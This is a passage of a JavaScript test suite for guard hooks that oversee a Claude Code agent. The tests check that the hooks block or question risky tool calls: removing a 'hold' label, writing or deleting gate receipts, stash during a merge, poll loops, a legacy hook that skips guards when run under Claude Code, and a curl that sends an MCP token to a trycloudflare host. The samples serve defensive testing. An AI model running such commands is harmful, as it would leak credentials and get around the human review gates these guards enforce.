    repo.g("checkout", "-q", "-");
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "main\n");
    repo.g("commit", "-qam", "main");
    repo.g("merge", "side"); // conflicts: MERGE_HEAD stays
    assert.equal(repo.g("rev-parse", "-q", "--verify", "MERGE_HEAD").status, 0, "fixture: a merge is in progress");
    for (const cmd of ["git stash", "git stash push -m wip", "git stash -u", "git -C . stash"]) {
      const r = run(cmd);
      assert.equal(r.status, 2, `${cmd}\n${r.stderr}`);
      assert.ok(r.stderr.trim().startsWith("BLOCKED: `git stash` while a merge is in progress drops MERGE_HEAD"), r.stderr);
    }
    for (const cmd of ["git stash list", "git stash show -p", "git stash pop", "git status"]) assert.equal(run(cmd).status, 0, cmd);
    repo.g("merge", "--abort");
    assert.equal(run("git stash").status, 0, "no merge in progress: a stash is fine");
  } finally { repo.rm(); }
});

// ── WP-L4 hook doors (2026-10-27; Bryce, asked "may I make the hook edits for the merge/arm door, receipts and hold
// removal?": "You consider the options and make the best decisions") ──────────────────────────────────────────────
test("WP-L4 hold door: removing `hold` asks on every shell route; other label edits pass", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-hold-"));
  const env = fakeGh(dir, {});
  const run = (command) => hook("bash-guard.sh", bashCall(command), { env, cwd: dir });
  try {
    for (const c of ["gh pr edit 12 --remove-label hold", "gh issue edit 7 --remove-label=bug,Hold", "gh pr edit 12 --remove-label 'hold'",
      "gh label delete hold --yes", "gh label edit hold --name parked",
      "gh api -X DELETE repos/o/r/issues/12/labels/hold", "gh api --method DELETE repos/o/r/issues/12/labels",
      "gh api -X PUT repos/o/r/issues/12/labels -f 'labels[]=bug'", "gh api -X DELETE repos/o/r/labels/hold",
      "gh api -X PATCH repos/o/r/issues/12 -f 'labels[]=bug'",
      "gh api graphql -f query='mutation { removeLabelsFromLabelable(input:{labelableId:\"x\", labelIds:[\"y\"]}) { clientMutationId } }'"]) {
      const r = run(c);
      assert.equal(decisionOf(r), "ask", `${c}: ${r.stdout}${r.stderr}`);
      assert.match(r.stdout, /REMOVES the `hold` label/, c);
    }
    for (const c of ["gh pr edit 12 --add-label hold", "gh pr edit 12 --remove-label run-ci", "gh issue edit 7 --remove-label holdout",
      "gh api -X POST repos/o/r/issues/12/labels -f 'labels[]=run-ci'", "gh api -X DELETE repos/o/r/issues/12/labels/run-ci",
      "gh api -X PUT repos/o/r/issues/12/labels -f 'labels[]=hold'", "gh label delete stale --yes", "gh api repos/o/r/issues/12/labels"])
      assert.equal(decisionOf(run(c)), null, `silent pass: ${c}`);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("WP-L4 hold door: MCP issue_write whose labels drop a live `hold` asks; unknown live labels ask; create passes", () => {
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "hook-hold-mcp-"));
  const run = (tool_input, labels) => decisionOf(hook("github-mcp-guard.sh", { tool_name: "mcp__github__issue_write", tool_input },
    { env: fakeGh(dir, { labels }), cwd: dir }));
  try {
    const upd = (labels) => ({ method: "update", owner: "o", repo: "r", issue_number: 12, labels });
    assert.equal(run(upd(["bug", "claimed"]), ["bug", "hold"]), "ask", "the replacing list drops a live hold");
    assert.equal(run(upd(["bug"]), null), "ask", "the live labels could not be read");
    assert.equal(run(upd(["bug", "HOLD"]), ["hold"]), null, "hold kept");
    assert.equal(run(upd(["bug", "claimed"]), ["bug"]), null, "no hold to drop");
    assert.equal(run({ method: "update", owner: "o", repo: "r", issue_number: 12, body: "x" }, null), null, "no labels in the call");
    assert.equal(run({ method: "create", owner: "o", repo: "r", title: "t", labels: ["bug"] }, null), null, "a new issue has no hold");
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8"));
  const g = settings.hooks.PreToolUse.find((x) => x.hooks.some((h) => h.command.includes("github-mcp-guard.sh")));
  const routed = new RegExp(g.matcher);
  assert.deepEqual(["mcp__github__issue_write", "mcp__github__issue_read"].map((n) => routed.test(n)), [true, false],
    "settings.json routes issue_write (not issue_read) through the guard");
});

test("WP-L4 receipt dirs: Write/Edit and Bash writes into artifacts/{merge,ready,launch}-gate/ and artifacts/launch/ are blocked", () => {
  const repo = scratchRepo("hook-rcpt-dirs-");
  const pf = (payload) => hook("protect-files.sh", { cwd: repo.dir, ...payload }, { cwd: repo.dir });
  try {
    for (const rel of ["artifacts/merge-gate/1.json", "artifacts/ready-gate/12.json", "artifacts/launch-gate/receipt.json", "artifacts/launch/self.json"]) {
      const file = path.join(repo.dir, rel);
      const w = pf({ tool_name: "Write", tool_input: { file_path: file, content: "{\"ok\":true}" } });
      assert.equal(w.status, 2, `Write ${rel}`);
      assert.match(w.stderr, /gate receipts are written only by their gate/);
      assert.equal(pf({ tool_name: "Edit", tool_input: { file_path: file, old_string: "a", new_string: "b" } }).status, 2, `Edit ${rel}`);
      for (const c of [`echo '{"ok":true}' > ${rel}`, `cat > ${rel} <<'EOT'\n{}\nEOT`, `cp /dev/null ${rel}`, `rm -f ${rel}`])
        assert.equal(pf(bashCall(c)).status, 2, `Bash: ${c}`);
    }
    const ok = pf({ tool_name: "Write", tool_input: { file_path: path.join(repo.dir, "artifacts/logs/x.log"), content: "x" } });
    assert.equal(ok.status, 0, ok.stderr);
    assert.equal(pf(bashCall("echo x > artifacts/launch-notes.txt")).status, 0, "a sibling name is not the directory");
  } finally { repo.rm(); }
});

test('split guards refuse malformed input and their own helper errors',()=>{
 const repo=scratchRepo('split-errors-');
 try{
  const names=['bash-guard.sh','protect-files.sh','mcp-browser-guard.sh','github-mcp-guard.sh'];
  for(const name of names){
   for(const payload of ['not json','[]','{"tool_input":[]}']){
    const r=hook(name,payload,{cwd:repo.dir});
    if(r.status!==2) {
      assert.equal(r.status,0,name+' '+r.stderr);
      assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision,'deny',name+' '+payload);
    }
   }
  }
  const bin=path.join(repo.dir,'bin');fs.mkdirSync(bin);fs.writeFileSync(path.join(bin,'python3'),'#!/bin/sh\nexit 71\n');fs.chmodSync(path.join(bin,'python3'),0o755);
  for(const name of names){
   const r=hook(name,{tool_name:'Bash',tool_input:{command:'git status'}},{cwd:repo.dir,env:{PATH:bin+path.delimiter+process.env.PATH}});
   assert.equal(r.status,2,name+' helper crash: '+r.stderr);
  }
  // A real interpreter executes the shipped entrypoint. Trace faults occur at
  // main(), outside payload parsing, so only its production crash handler can deny.
  const faultDir=path.join(repo.dir,'fault');fs.mkdirSync(faultDir);
  fs.writeFileSync(path.join(faultDir,'sitecustomize.py'),`import os,sys
wanted=os.environ.get('FAULT_HOOK','')
def trace(frame,event,arg):
 if event=='call' and frame.f_code.co_name=='main' and frame.f_code.co_filename.endswith(wanted):
  raise RuntimeError('fixture internal fault')
 return trace
sys.settrace(trace)
`);
  for(const name of ['launch-gate.py','context-cap.py']){
   const invoke=(extra={})=>spawnSync('python3',[path.join(ROOT,'.claude/hooks',name),'--guard'],{
    input:JSON.stringify({tool_name:'Agent',tool_input:{prompt:'x'}}),cwd:repo.dir,encoding:'utf8',
    env:{...process.env,CLAUDE_PROJECT_DIR:repo.dir,APEX_CTX_CAP:'',PYTHONPATH:faultDir,FAULT_HOOK:name,...extra}});
   const r=invoke();assert.equal(r.status,2,name+' internal error: '+r.stderr);assert.match(r.stderr,/fixture internal fault/);
   if(name==='context-cap.py'){
    assert.equal(invoke({APEX_CTX_CAP:'off'}).status,0,'explicit cap override survives internal failure');
    fs.mkdirSync(path.join(repo.dir,'.claude'),{recursive:true});fs.writeFileSync(path.join(repo.dir,'.claude/allow-context-cap'),'');
    assert.equal(invoke().status,0,'fixture cap hatch survives internal failure');
   }
  }
  const broken=path.join(repo.dir,'broken-guard');fs.mkdirSync(broken);
  fs.copyFileSync(path.join(ROOT,'.claude/hooks/github-mcp-guard.sh'),path.join(broken,'github-mcp-guard.sh'));
  fs.writeFileSync(path.join(broken,'merge_policy.py'),'raise RuntimeError("fixture broken policy")\n');
  const crash=spawnSync('bash',[path.join(broken,'github-mcp-guard.sh')],{input:JSON.stringify({tool_name:'mcp__github__merge_pull_request',tool_input:{pullNumber:1}}),encoding:'utf8',cwd:repo.dir});
  assert.equal(crash.status,2,crash.stderr);assert.match(crash.stderr,/fixture broken policy/);

 }finally{repo.rm();}
});


test('bash-guard refuses malformed nonempty decisions from its parser',()=>{
 const repo=scratchRepo('split-decision-');
 try{
  const bin=path.join(repo.dir,'bin');fs.mkdirSync(bin);
  const python=spawnSync('which',['python3'],{encoding:'utf8'}).stdout.trim();
  fs.writeFileSync(path.join(bin,'python3'),`#!/bin/sh
if [ "$2" = guard ]; then printf '0 0 0 -\\n0\\n%s\\n' "$FIXTURE_DECISION"; else exec '${python}' "$@"; fi
`);
  fs.chmodSync(path.join(bin,'python3'),0o755);
  const malformed = ['broken', '[]', '{}', '{"hookSpecificOutput":{"permissionDecision":"unexpected"}}',
   ...[
    {hookEventName:'PreToolUse'},
    {hookEventName:'OtherEvent',additionalContext:'advice'},
    {hookEventName:'PreToolUse',additionalContext:''},
    {hookEventName:'PreToolUse',additionalContext:[]},
    {hookEventName:'PreToolUse',additionalContext:null},
    {hookEventName:'PreToolUse',permissionDecision:'unexpected',additionalContext:'advice'},
    {hookEventName:'PreToolUse',permissionDecision:null,additionalContext:'advice'},
    {hookEventName:'PreToolUse',permissionDecision:'deny',permissionDecisionReason:[]},
    {hookEventName:'PreToolUse',permissionDecision:'deny',additionalContext:42},
   ].map(hookSpecificOutput=>JSON.stringify({hookSpecificOutput}))];
  for(const decision of malformed){
   const r=hook('bash-guard.sh',bashCall('git status'),{cwd:repo.dir,env:{PATH:bin+path.delimiter+process.env.PATH,FIXTURE_DECISION:decision}});
   assert.equal(r.status,2,decision+' '+r.stderr);assert.match(r.stderr,/could not write its decision JSON/);
  }
 }finally{repo.rm();}
});


test("escape-hatch notices go to stderr so stdout stays empty or one JSON object (H5, 2026-10-29)", () => {
  const repo = scratchRepo("hook-hatch-stderr-");
  try {
    fs.mkdirSync(path.join(repo.dir, ".claude"), { recursive: true });
    const run = (command) => hook("bash-guard.sh", bashCall(command), { cwd: repo.dir });
    const assertStdout = (stdout) => {
      const t = stdout.trim();
      if (t === "") return;
      assert.equal(t.split("\n").filter(Boolean).length, 1, "stdout must be at most one JSON object");
      JSON.parse(t);
    };
    for (const h of ["allow-protected", "allow-context-cap", "allow-stop"]) {
      const hatch = path.join(repo.dir, ".claude", h);
      fs.writeFileSync(hatch, "");
      const r = run("git status");
      assert.equal(r.status, 0, `${h}: ${r.stderr}`);
      assertStdout(r.stdout);
      assert.match(r.stderr, new RegExp(`hatch active: \\.claude/${h.replace(/-/g, "\\-")}`));
      fs.unlinkSync(hatch);
    }
  } finally {
    repo.rm();
  }
});

test('bash-guard refuses an active legacy hook that skips Claude Code; split hook passes',()=>{
 const repo=scratchRepo('split-legacy-');
 try{
  const target=path.join(repo.dir,'.githooks/pre-commit');
  fs.mkdirSync(path.dirname(target),{recursive:true});
  fs.writeFileSync(target,'#!/bin/sh\n[ -n "${CLAUDECODE:-}" ] && exit 0\nexit 0\n');fs.chmodSync(target,0o755);
  repo.g('config','core.hooksPath','.githooks');
  const run=()=>hook('bash-guard.sh',bashCall('git commit -m x'),{cwd:repo.dir,env:{CLAUDECODE:'1'}});
  const legacy=run();assert.equal(legacy.status,2,legacy.stderr);assert.match(legacy.stderr,/would run NO guards/);
  fs.copyFileSync(path.join(ROOT,'.githooks/pre-commit'),target);fs.chmodSync(target,0o755);
  const split=run();assert.equal(split.status,0,split.stderr);assert.equal(split.stdout,'');
 }finally{repo.rm();}
});

test("until/while … sleep is refused whatever it watches, and names wait-for / background ci-watch; prose is not a loop (finding 5)", () => {
  const run = (command, env = {}) => hook("bash-guard.sh", bashCall(command), { env: { APEX_HELD_CHECK: "0", ...env } });
  for (const c of ["until grep -q done log; do sleep 5; done", "while ! test -f x; do sleep 1; done", "if a; then until b; do sleep 2; done; fi"]) {
    const r = run(c);
    assert.equal(r.status, 2, `must refuse: ${c}`);
    assert.equal(/wait-for\.mjs --log-matches/.test(r.stderr), true, "r.stderr ~ " + /wait-for\.mjs --log-matches/);
    assert.equal(/ci-watch\.mjs --sha/.test(r.stderr), true, "r.stderr ~ " + /ci-watch\.mjs --sha/);
  }
  for (const c of ['git commit -m "docs: ci-watch beats while true; do ci-watch; sleep 5; done"', "echo ci-watch and sleep until done do", "while read -r l; do sleep 1; done < f"])
    assert.equal(run(c).status, 0, `not a poll loop: ${c}`);
});

test("a piped or foreground-full tooling-fast, and a piped ready-gate, are refused with the closing line named (finding 4)", () => {
  const run = (command, input = {}) => hook("bash-guard.sh", { ...bashCall(command), tool_input: { command, ...input } }, { env: { APEX_HELD_CHECK: "0" } });
  for (const c of ["node tools/ci/tooling-fast.mjs --changed --jobs=3 | tail -3", "node tools/ci/ready-gate.mjs --pr 5 | head", "npm run test:tooling-fast | tail"]) {
    const r = run(c, { run_in_background: true });
    assert.equal(r.status, 2, `must refuse: ${c}`);
    assert.equal(/= tooling-fast passed\|failed/.test(r.stderr), true, "r.stderr ~ " + /= tooling-fast passed\|failed/);
  }
  assert.equal(run("node tools/ci/tooling-fast.mjs").status, 2, "foreground full floor");
  assert.equal(/run_in_background/.test(run("npm run test:tooling-fast").stderr), true, "names run_in_background");
  for (const [c, bg] of [["node tools/ci/tooling-fast.mjs --changed --jobs=3 --quiet", false], ["node tools/ci/tooling-fast.mjs", true],
    ["node tools/ci/tooling-fast.mjs --print-scope", false], ['echo "tooling-fast | tail"', false]])
    assert.equal(run(c, { run_in_background: bg }).status, 0, `allowed: ${c}`);
});

test("a /mcp?token=<value> credential URL in a shell command is refused; prose and short stubs pass", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    "curl https://x.trycloudflare.com/mcp?token=abcdef0123456789",
    'echo "url: https://h/mcp?token=AbCd-1234_wxyz"',
    "node tools/shot/apex-eval.mjs --url 'http://127.0.0.1:3000/mcp?token=0123456789abcdef'",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  for (const cmd of ["echo see /mcp?token= in the skill", "git log --oneline -3"])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});
